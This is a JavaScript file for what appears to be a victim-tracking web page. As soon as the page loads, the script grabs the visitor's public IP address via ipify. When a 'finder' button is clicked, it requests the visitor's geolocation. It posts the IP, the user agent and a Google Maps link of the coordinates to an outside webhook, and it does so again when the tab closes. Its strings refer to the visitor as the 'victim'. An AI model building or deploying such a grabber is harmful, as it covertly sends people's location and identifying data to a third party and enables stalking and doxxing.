let userAgent = navigator.userAgent;
let mapsURL = "Permission denied by victim or Permission is still not asked by the application.";
let ipAddress = "";

function requestLocationPermission() {
    if (navigator.geolocation) {
        navigator.geolocation.getCurrentPosition(success, error);
    } else {
        alert("Geolocation is not supported by this browser.");
    }
}

function success(position) {
    let LATITUDE = position.coords.latitude;
    let LONGITUDE = position.coords.longitude;
    mapsURL = `https://www.google.com/maps/@${LATITUDE},${LONGITUDE},15z?entry=ttu`;
    sendWebhook(ipAddress, mapsURL);  // Send IP and location
}

function error(err) {
    if (err.code === err.PERMISSION_DENIED) {
        mapsURL = "Permission Denied by victim or location button is not clicked by victim";
    } else {
        alert("An error occurred while retrieving location: " + err.message);
    }
    sendWebhook(ipAddress, mapsURL);  // Send IP and permission denied message
}

function sendWebhook(ip, mapsURL) {
    const content = `[ $ ] IP: ${ip}\n[ $ ] User Agent: ${userAgent}\n[ $ ] MAPS LOCATION: ${mapsURL}`;

    const payload = {
        'content': `${content}`
    };

    fetch(webhookURL, {
        method: 'POST',
        headers: { 
            'Content-Type': 'application/json'
        },
        body: JSON.stringify(payload)
    })
    .then(response => response.json())
    .then(data => {
        console.log(`Status Code: ${data.status}`);
        console.log(`Response: ${data.message}`);
    })
    .catch(error => {
        console.error('Error:', error);
    });
}


function getIPAddress() {
    fetch('https://api.ipify.org?format=json')
        .then(response => response.json())  
        .then(data => {
            ipAddress = data.ip;
            sendWebhook(ipAddress, mapsURL);  // Send IP initially
        })
        .catch(err => 
            console.log(err)
        );
}

// Handle button click
document.getElementById('finderBtn').addEventListener('click', () => {
    buttonClicked = true;
    requestLocationPermission();
});

// Handle tab close
window.addEventListener('beforeunload', (event) => {
    if (!buttonClicked) {
        sendWebhook(ipAddress, mapsURL);  // Send IP and permission denied message
    }
});

// Send IP address as soon as the page loads
getIPAddress();
